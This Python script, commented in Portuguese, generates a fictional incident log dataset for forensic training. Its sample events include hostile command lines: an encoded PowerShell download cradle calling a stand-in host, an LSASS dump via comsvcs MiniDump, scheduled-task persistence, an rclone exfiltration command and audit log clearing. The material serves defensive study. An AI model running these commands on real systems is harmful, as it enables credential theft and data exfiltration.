"""Gera o caso sintético em samples/caso-sintetico/ (incidente FICTÍCIO para testes e treino).

Uso: uv run python scripts/gerar_caso_sintetico.py

Cenário (tudo fictício; IPs de documentação RFC 5737, domínios .example):
  phishing (.xlsm) -> macro -> PowerShell encoded -> C2 -> updater.exe -> tarefa agendada
  -> dump do LSASS (comsvcs MiniDump) -> credencial svc_backup (logada mais cedo na estação)
  -> RDP para SRV-FILE-01 (sem EDR) -> rclone -> exfiltração ~2,3 GB -> limpeza do log de segurança.
  Em paralelo: MFA fatigue + sign-in da conta m.silva a partir da NL, novo método MFA e consent OAuth.
"""

from __future__ import annotations

import base64
import csv
import hashlib
import json
from pathlib import Path

OUT = Path(__file__).resolve().parents[1] / "samples" / "caso-sintetico"


def h(seed: str) -> str:
    return hashlib.sha256(f"perito-sintetico::{seed}".encode()).hexdigest()


PS_PAYLOAD = "IEX (New-Object Net.WebClient).DownloadString('https://cdn-update.example-cdn.net/a')"
ENC = base64.b64encode(PS_PAYLOAD.encode("utf-16-le")).decode()

XLSM = r"C:\Users\m.silva\AppData\Local\Microsoft\Windows\INetCache\Content.Outlook\Q2X8LM1Z\Fatura_88213.xlsm"
UPDATER = r"C:\Users\m.silva\AppData\Roaming\Microsoft\updater.exe"
RCLONE = r"C:\ProgramData\rc\rclone.exe"
RCLONE_CMD = r"C:\ProgramData\rc\rclone.exe copy D:\Financeiro remote:bkp --transfers 8 --config C:\ProgramData\rc\rclone.conf"


# ------------------------------------------------------------------ Defender (Advanced Hunting)
DEF_COLS = [
    "TableName", "Timestamp", "DeviceName", "ActionType", "AccountDomain", "AccountName",
    "FileName", "FolderPath", "SHA256", "ProcessCommandLine", "InitiatingProcessFileName",
    "InitiatingProcessCommandLine", "InitiatingProcessAccountName", "RemoteIP", "RemotePort",
    "RemoteUrl", "LocalIP", "LogonType", "SenderFromAddress", "RecipientEmailAddress",
    "Subject", "DeliveryAction", "AdditionalFields",
]
WS = "ws-fin-023.acme.local"


def d(**kw):
    return {c: kw.get(c, "") for c in DEF_COLS}


defender = [
    d(TableName="DeviceLogonEvents", Timestamp="2026-11-10T11:30:00.0000000Z", DeviceName=WS, ActionType="LogonSuccess",
      AccountDomain="acme", AccountName="m.silva", LogonType="Interactive"),
    d(TableName="DeviceLogonEvents", Timestamp="2026-11-10T11:55:12.4410000Z", DeviceName=WS, ActionType="LogonSuccess",
      AccountDomain="acme", AccountName="svc_backup", LogonType="RemoteInteractive", RemoteIP="10.10.0.50"),
    d(TableName="EmailEvents", Timestamp="2026-11-10T13:02:11.3410000Z", ActionType="", SenderFromAddress="faturas@pagamentos-fornecedor.example",
      RecipientEmailAddress="m.silva@acme.com.br", Subject="Fatura pendente NF 88213", DeliveryAction="Delivered",
      FileName="Fatura_88213.xlsm", SHA256=h("xlsm"), RemoteIP="203.0.113.80"),
    d(TableName="DeviceProcessEvents", Timestamp="2026-11-10T13:05:00.1000000Z", DeviceName=WS, ActionType="ProcessCreated",
      AccountDomain="acme", AccountName="m.silva", FileName="ms-teams.exe",
      FolderPath=r"C:\Program Files\WindowsApps\MSTeams\ms-teams.exe", SHA256=h("teams"),
      ProcessCommandLine='"ms-teams.exe"', InitiatingProcessFileName="explorer.exe", InitiatingProcessAccountName="m.silva"),
    d(TableName="DeviceNetworkEvents", Timestamp="2026-11-10T13:06:10.0000000Z", DeviceName=WS, ActionType="ConnectionSuccess",
      InitiatingProcessFileName="msedge.exe", InitiatingProcessAccountName="m.silva", RemoteIP="192.0.2.200", RemotePort="443",
      RemoteUrl="www.office.com", LocalIP="10.10.20.23"),
    d(TableName="DeviceFileEvents", Timestamp="2026-11-10T13:07:45.5120000Z", DeviceName=WS, ActionType="FileCreated",
      FileName="Fatura_88213.xlsm", FolderPath=XLSM, SHA256=h("xlsm"), InitiatingProcessFileName="OUTLOOK.EXE",
      InitiatingProcessCommandLine='"OUTLOOK.EXE"', InitiatingProcessAccountName="m.silva"),
    d(TableName="DeviceProcessEvents", Timestamp="2026-11-10T13:08:02.2010000Z", DeviceName=WS, ActionType="ProcessCreated",
      AccountDomain="acme", AccountName="m.silva", FileName="EXCEL.EXE",
      FolderPath=r"C:\Program Files\Microsoft Office\root\Office16\EXCEL.EXE", SHA256=h("excel"),
      ProcessCommandLine=f'"EXCEL.EXE" "{XLSM}"', InitiatingProcessFileName="OUTLOOK.EXE", InitiatingProcessAccountName="m.silva"),
    d(TableName="DeviceProcessEvents", Timestamp="2026-11-10T13:08:19.7740000Z", DeviceName=WS, ActionType="ProcessCreated",
      AccountDomain="acme", AccountName="m.silva", FileName="powershell.exe",
      FolderPath=r"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe", SHA256=h("powershell"),
      ProcessCommandLine=f"powershell.exe -nop -w hidden -enc {ENC}", InitiatingProcessFileName="EXCEL.EXE",
      InitiatingProcessCommandLine=f'"EXCEL.EXE" "{XLSM}"', InitiatingProcessAccountName="m.silva"),
    d(TableName="DeviceNetworkEvents", Timestamp="2026-11-10T13:08:21.0900000Z", DeviceName=WS, ActionType="ConnectionSuccess",
      InitiatingProcessFileName="powershell.exe", InitiatingProcessCommandLine=f"powershell.exe -nop -w hidden -enc {ENC}",
      InitiatingProcessAccountName="m.silva", RemoteIP="203.0.113.45", RemotePort="443",
      RemoteUrl="cdn-update.example-cdn.net", LocalIP="10.10.20.23"),
    d(TableName="DeviceFileEvents", Timestamp="2026-11-10T13:08:40.3000000Z", DeviceName=WS, ActionType="FileCreated",
      FileName="updater.exe", FolderPath=UPDATER, SHA256=h("updater"), InitiatingProcessFileName="powershell.exe",
      InitiatingProcessAccountName="m.silva"),
    d(TableName="DeviceProcessEvents", Timestamp="2026-11-10T13:09:05.1180000Z", DeviceName=WS, ActionType="ProcessCreated",
      AccountDomain="acme", AccountName="m.silva", FileName="schtasks.exe", FolderPath=r"C:\Windows\System32\schtasks.exe",
      SHA256=h("schtasks"),
      ProcessCommandLine=f'schtasks.exe /create /tn "MicrosoftEdgeUpdateTaskCore" /tr "{UPDATER}" /sc onlogon /rl highest /f',
      InitiatingProcessFileName="powershell.exe", InitiatingProcessAccountName="m.silva"),
    d(TableName="DeviceEvents", Timestamp="2026-11-10T13:09:05.4000000Z", DeviceName=WS, ActionType="ScheduledTaskCreated",
      AccountDomain="acme", AccountName="m.silva", InitiatingProcessFileName="schtasks.exe",
      AdditionalFields=json.dumps({"TaskName": r"\MicrosoftEdgeUpdateTaskCore", "TaskContent": UPDATER})),
    d(TableName="DeviceProcessEvents", Timestamp="2026-11-10T13:12:30.0000000Z", DeviceName=WS, ActionType="ProcessCreated",
      AccountDomain="acme", AccountName="m.silva", FileName="updater.exe", FolderPath=UPDATER, SHA256=h("updater"),
      ProcessCommandLine=f'"{UPDATER}"', InitiatingProcessFileName="powershell.exe", InitiatingProcessAccountName="m.silva"),
    d(TableName="DeviceProcessEvents", Timestamp="2026-11-10T13:15:30.6600000Z", DeviceName=WS, ActionType="ProcessCreated",
      AccountDomain="acme", AccountName="m.silva", FileName="rundll32.exe", FolderPath=r"C:\Windows\System32\rundll32.exe",
      SHA256=h("rundll32"), ProcessCommandLine=r"rundll32.exe C:\Windows\System32\comsvcs.dll, MiniDump 712 C:\Users\Public\d.bin full",
      InitiatingProcessFileName="updater.exe", InitiatingProcessAccountName="m.silva"),
    d(TableName="DeviceEvents", Timestamp="2026-11-10T13:15:30.9100000Z", DeviceName=WS, ActionType="OpenProcessApiCall",
      AccountDomain="acme", AccountName="m.silva", FileName="lsass.exe", FolderPath=r"C:\Windows\System32\lsass.exe",
      InitiatingProcessFileName="rundll32.exe", InitiatingProcessAccountName="m.silva",
      AdditionalFields=json.dumps({"DesiredAccess": 2097151})),
    d(TableName="DeviceFileEvents", Timestamp="2026-11-10T13:15:34.0000000Z", DeviceName=WS, ActionType="FileCreated",
      FileName="d.bin", FolderPath=r"C:\Users\Public\d.bin", SHA256=h("dump"), InitiatingProcessFileName="rundll32.exe",
      InitiatingProcessAccountName="m.silva"),
    d(TableName="DeviceProcessEvents", Timestamp="2026-11-10T13:39:50.0000000Z", DeviceName=WS, ActionType="ProcessCreated",
      AccountDomain="acme", AccountName="m.silva", FileName="mstsc.exe", FolderPath=r"C:\Windows\System32\mstsc.exe",
      SHA256=h("mstsc"), ProcessCommandLine="mstsc.exe /v:10.10.30.5", InitiatingProcessFileName="updater.exe",
      InitiatingProcessAccountName="m.silva"),
    d(TableName="DeviceNetworkEvents", Timestamp="2026-11-10T13:39:58.0000000Z", DeviceName=WS, ActionType="ConnectionSuccess",
      InitiatingProcessFileName="mstsc.exe", InitiatingProcessAccountName="m.silva", RemoteIP="10.10.30.5", RemotePort="3389",
      LocalIP="10.10.20.23"),
]

# ------------------------------------------------------------------ Sentinel (SecurityEvent, JSON)
SRV = "SRV-FILE-01.acme.local"


def se(ts, eid, activity, **kw):
    base = {"TimeGenerated": ts, "Type": "SecurityEvent", "Computer": SRV, "EventID": eid, "Activity": activity}
    base.update(kw)
    return base


sentinel = [
    se("2026-11-10T13:30:00.000Z", 4624, "4624 - An account was successfully logged on.", Account="ACME\\DC01$",
       TargetUserName="DC01$", LogonType=3, IpAddress="10.10.0.10", WorkstationName="DC01"),
    se("2026-11-10T13:40:12.000Z", 4624, "4624 - An account was successfully logged on.", Account="ACME\\svc_backup",
       TargetUserName="svc_backup", LogonType=10, IpAddress="10.10.20.23", WorkstationName="WS-FIN-023"),
    se("2026-11-10T13:40:12.500Z", 4672, "4672 - Special privileges assigned to new logon.", Account="ACME\\svc_backup",
       SubjectUserName="svc_backup", PrivilegeList="SeBackupPrivilege SeRestorePrivilege SeDebugPrivilege"),
    se("2026-11-10T13:41:30.000Z", 4688, "4688 - A new process has been created.", Account="ACME\\svc_backup",
       SubjectUserName="svc_backup", NewProcessName=r"C:\Windows\System32\cmd.exe", ParentProcessName=r"C:\Windows\explorer.exe",
       CommandLine='"C:\\Windows\\System32\\cmd.exe"'),
    se("2026-11-10T13:52:10.000Z", 4688, "4688 - A new process has been created.", Account="ACME\\svc_backup",
       SubjectUserName="svc_backup", NewProcessName=r"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe",
       ParentProcessName=r"C:\Windows\System32\cmd.exe",
       CommandLine=r'powershell -c "iwr https://cdn-update.example-cdn.net/r.zip -o C:\ProgramData\rc\r.zip; Expand-Archive C:\ProgramData\rc\r.zip C:\ProgramData\rc"'),
    se("2026-11-10T13:57:40.000Z", 4688, "4688 - A new process has been created.", Account="ACME\\svc_backup",
       SubjectUserName="svc_backup", NewProcessName=RCLONE, ParentProcessName=r"C:\Windows\System32\cmd.exe", CommandLine=RCLONE_CMD),
    se("2026-11-10T14:31:05.000Z", 1102, "1102 - The audit log was cleared.", Account="ACME\\svc_backup", SubjectUserName="svc_backup"),
]

# ------------------------------------------------------------------ Entra ID sign-in logs (JSON)
def signin(ts, upn, ip, app, ok, code=0, reason="", city="São Paulo", country="BR", risk="none", dev="", ua="Mozilla/5.0 (Windows NT 10.0; Win64; x64) Edg/131.0", n=0):
    return {
        "id": f"{h(ts+upn)[:8]}-{h(app)[:4]}-4{h(ip)[:3]}-8{h(str(n))[:3]}-{h(ts)[:12]}",
        "createdDateTime": ts,
        "userDisplayName": upn.split("@")[0].replace(".", " ").title(),
        "userPrincipalName": upn,
        "appDisplayName": app,
        "ipAddress": ip,
        "clientAppUsed": "Browser",
        "userAgent": ua,
        "status": {"errorCode": code, "failureReason": reason},
        "location": {"city": city, "countryOrRegion": country},
        "riskLevelDuringSignIn": risk,
        "conditionalAccessStatus": "success" if ok else "failure",
        "authenticationRequirement": "multiFactorAuthentication",
        "deviceDetail": {"displayName": dev, "operatingSystem": "Windows10", "isCompliant": bool(dev)},
    }


MFA_DENY = "Authentication failed during strong authentication request. The user denied the MFA push."
ATK_UA = "Mozilla/5.0 (X11; Linux x86_64) Firefox/128.0"
entra_signin = [
    signin("2026-11-10T11:31:02Z", "m.silva@acme.com.br", "192.0.2.10", "Office 365 Exchange Online", True, dev="WS-FIN-023"),
    signin("2026-11-10T12:10:00Z", "j.souza@acme.com.br", "192.0.2.10", "Microsoft Teams", True, dev="WS-FIN-041"),
    signin("2026-11-10T13:22:10Z", "m.silva@acme.com.br", "198.51.100.77", "OfficeHome", False, 500121, MFA_DENY, "Amsterdam", "NL", "medium", ua=ATK_UA, n=1),
    signin("2026-11-10T13:23:05Z", "m.silva@acme.com.br", "198.51.100.77", "OfficeHome", False, 500121, MFA_DENY, "Amsterdam", "NL", "medium", ua=ATK_UA, n=2),
    signin("2026-11-10T13:24:51Z", "m.silva@acme.com.br", "198.51.100.77", "OfficeHome", False, 500121, MFA_DENY, "Amsterdam", "NL", "medium", ua=ATK_UA, n=3),
    signin("2026-11-10T13:25:03Z", "m.silva@acme.com.br", "198.51.100.77", "OfficeHome", True, city="Amsterdam", country="NL", risk="medium", ua=ATK_UA, n=4),
    signin("2026-11-10T13:28:00Z", "m.silva@acme.com.br", "198.51.100.77", "Office 365 Exchange Online", True, city="Amsterdam", country="NL", risk="medium", ua=ATK_UA, n=5),
]

# ------------------------------------------------------------------ Entra ID audit logs (JSON)
entra_audit = [
    {
        "id": "Directory_" + h("a0")[:16], "activityDateTime": "2026-11-10T10:00:00Z", "activityDisplayName": "Update user",
        "category": "UserManagement", "result": "success", "loggedByService": "Core Directory",
        "initiatedBy": {"user": {"userPrincipalName": "admin.ti@acme.com.br", "ipAddress": "192.0.2.10"}},
        "targetResources": [{"type": "User", "userPrincipalName": "j.souza@acme.com.br", "displayName": "J Souza"}],
        "additionalDetails": [],
    },
    {
        "id": "AuthMethods_" + h("a1")[:16], "activityDateTime": "2026-11-10T13:26:12Z", "activityDisplayName": "User registered security info",
        "category": "UserManagement", "result": "success", "loggedByService": "Authentication Methods",
        "initiatedBy": {"user": {"userPrincipalName": "m.silva@acme.com.br", "ipAddress": "198.51.100.77"}},
        "targetResources": [{"type": "User", "userPrincipalName": "m.silva@acme.com.br", "displayName": "M Silva"}],
        "additionalDetails": [{"key": "Method", "value": "Microsoft Authenticator App"}],
    },
    {
        "id": "Directory_" + h("a2")[:16], "activityDateTime": "2026-11-10T13:30:44Z", "activityDisplayName": "Consent to application",
        "category": "ApplicationManagement", "result": "success", "loggedByService": "Core Directory",
        "initiatedBy": {"user": {"userPrincipalName": "m.silva@acme.com.br", "ipAddress": "198.51.100.77"}},
        "targetResources": [{"type": "ServicePrincipal", "displayName": "MailSync Pro", "id": "6f1c0000-0000-4000-8000-00000000beef"}],
        "additionalDetails": [{"key": "Permissions", "value": "Mail.Read Mail.Send offline_access"}],
    },
]

# ------------------------------------------------------------------ Splunk (CSV export)
SPL_COLS = ["_time", "host", "source", "sourcetype", "EventCode", "Image", "CommandLine", "ParentImage", "User", "Hashes",
            "DestinationIp", "DestinationPort", "DestinationHostname", "src_ip", "dest_ip", "dest_port", "bytes_out",
            "bytes_in", "app", "action"]
SYSMON = "XmlWinEventLog:Microsoft-Windows-Sysmon/Operational"


def s(**kw):
    return {c: kw.get(c, "") for c in SPL_COLS}


splunk = [
    s(_time="2026-11-10T10:08:21.300-03:00", host="pa-fw-01", source="udp:514", sourcetype="pan:traffic",
      src_ip="10.10.20.23", dest_ip="203.0.113.45", dest_port="443", bytes_out="4521", bytes_in="188213", app="ssl", action="allowed"),
    s(_time="2026-11-10T10:30:00.000-03:00", host="pa-fw-01", source="udp:514", sourcetype="pan:traffic",
      src_ip="10.10.20.41", dest_ip="192.0.2.200", dest_port="443", bytes_out="20311", bytes_in="993120", app="ms-office365-base", action="allowed"),
    s(_time="2026-11-10T10:52:12.900-03:00", host="pa-fw-01", source="udp:514", sourcetype="pan:traffic",
      src_ip="10.10.30.5", dest_ip="203.0.113.45", dest_port="443", bytes_out="3120", bytes_in="21400000", app="ssl", action="allowed"),
    s(_time="2026-11-10T10:57:40.120-03:00", host="SRV-FILE-01", source=SYSMON, sourcetype=SYSMON, EventCode="1", Image=RCLONE,
      CommandLine=RCLONE_CMD, ParentImage=r"C:\Windows\System32\cmd.exe", User="ACME\\svc_backup", Hashes=f"SHA256={h('rclone').upper()}"),
    s(_time="2026-11-10T10:57:43.004-03:00", host="SRV-FILE-01", source=SYSMON, sourcetype=SYSMON, EventCode="3", Image=RCLONE,
      User="ACME\\svc_backup", DestinationIp="198.51.100.200", DestinationPort="443", DestinationHostname="bkp.example-storage.net"),
    s(_time="2026-11-10T11:14:58.000-03:00", host="pa-fw-01", source="udp:514", sourcetype="pan:traffic",
      src_ip="10.10.30.5", dest_ip="198.51.100.200", dest_port="443", bytes_out="1288490188", bytes_in="5521200", app="ssl", action="allowed"),
    s(_time="2026-11-10T11:31:10.000-03:00", host="pa-fw-01", source="udp:514", sourcetype="pan:traffic",
      src_ip="10.10.30.5", dest_ip="198.51.100.200", dest_port="443", bytes_out="1181116006", bytes_in="4810022", app="ssl", action="allowed"),
]

# ------------------------------------------------------------------ Elastic (ECS NDJSON, DNS)
elastic = [
    {"@timestamp": "2026-11-10T13:06:09.120Z", "event": {"category": ["network"], "type": ["protocol"], "dataset": "dns"},
     "host": {"name": "dc01"}, "source": {"ip": "10.10.20.23"}, "dns": {"question": {"name": "www.office.com"}, "resolved_ip": ["192.0.2.200"]}},
    {"@timestamp": "2026-11-10T13:08:20.441Z", "event": {"category": ["network"], "type": ["protocol"], "dataset": "dns"},
     "host": {"name": "dc01"}, "source": {"ip": "10.10.20.23"}, "dns": {"question": {"name": "cdn-update.example-cdn.net"}, "resolved_ip": ["203.0.113.45"]}},
    {"@timestamp": "2026-11-10T13:52:11.020Z", "event": {"category": ["network"], "type": ["protocol"], "dataset": "dns"},
     "host": {"name": "dc01"}, "source": {"ip": "10.10.30.5"}, "dns": {"question": {"name": "cdn-update.example-cdn.net"}, "resolved_ip": ["203.0.113.45"]}},
    {"@timestamp": "2026-11-10T13:57:42.800Z", "event": {"category": ["network"], "type": ["protocol"], "dataset": "dns"},
     "host": {"name": "dc01"}, "source": {"ip": "10.10.30.5"}, "dns": {"question": {"name": "bkp.example-storage.net"}, "resolved_ip": ["198.51.100.200"]}},
]

# ------------------------------------------------------------------ Wazuh (alerts.json, NDJSON)
def wz(ts, rid, level, desc, eid, mitre=None, agent="SRV-FILE-01", aip="10.10.30.5",
       provider="Microsoft-Windows-Security-Auditing", **eventdata):
    return {
        "timestamp": ts,
        "rule": {"id": rid, "level": level, "description": desc, "groups": ["windows", "windows_security"],
                 "mitre": {"id": mitre or []}},
        "agent": {"id": "007", "name": agent, "ip": aip},
        "manager": {"name": "wazuh-manager"},
        "id": h(ts + rid)[:16],
        "location": "EventChannel",
        "data": {"win": {"system": {"eventID": str(eid), "providerName": provider, "computer": f"{agent}.acme.local"},
                         "eventdata": eventdata}},
    }


wazuh = [
    wz("2026-11-10T10:30:00.210-0300", "60106", 3, "Windows Logon Success", 4624, targetUserName="DC01$", logonType="3", ipAddress="10.10.0.10"),
    wz("2026-11-10T10:40:15.512-0300", "92653", 6, "User: ACME\\svc_backup logged using Remote Desktop Connection (RDP) from ip:10.10.20.23.",
       4624, ["T1021.001"], targetUserName="svc_backup", targetDomainName="ACME", logonType="10", ipAddress="10.10.20.23"),
    wz("2026-11-10T10:57:41.000-0300", "100200", 12, "Ferramenta de sincronização em nuvem (rclone) executada em servidor", 1,
       ["T1567.002"], provider="Microsoft-Windows-Sysmon", image=RCLONE, commandLine=RCLONE_CMD, user="ACME\\svc_backup", parentImage=r"C:\Windows\System32\cmd.exe"),
    wz("2026-11-10T11:31:05.400-0300", "63103", 10, "The audit log was cleared.", 1102, ["T1070.001"], subjectUserName="svc_backup"),
]


def main() -> None:
    OUT.mkdir(parents=True, exist_ok=True)
    with (OUT / "defender_advanced_hunting.csv").open("w", newline="", encoding="utf-8") as fh:
        w = csv.DictWriter(fh, fieldnames=DEF_COLS)
        w.writeheader()
        w.writerows(defender)
    (OUT / "sentinel_securityevent.json").write_text(json.dumps(sentinel, indent=2, ensure_ascii=False), encoding="utf-8")
    (OUT / "entra_signin.json").write_text(json.dumps(entra_signin, indent=2, ensure_ascii=False), encoding="utf-8")
    (OUT / "entra_audit.json").write_text(json.dumps(entra_audit, indent=2, ensure_ascii=False), encoding="utf-8")
    with (OUT / "splunk_export.csv").open("w", newline="", encoding="utf-8") as fh:
        w = csv.DictWriter(fh, fieldnames=SPL_COLS)
        w.writeheader()
        w.writerows(splunk)
    (OUT / "elastic_dns.ndjson").write_text("".join(json.dumps(e, ensure_ascii=False) + "\n" for e in elastic), encoding="utf-8")
    (OUT / "wazuh_alerts.json").write_text("".join(json.dumps(e, ensure_ascii=False) + "\n" for e in wazuh), encoding="utf-8")
    total = len(defender) + len(sentinel) + len(entra_signin) + len(entra_audit) + len(splunk) + len(elastic) + len(wazuh)
    print(f"{total} eventos gerados em {OUT}")


if __name__ == "__main__":
    main()
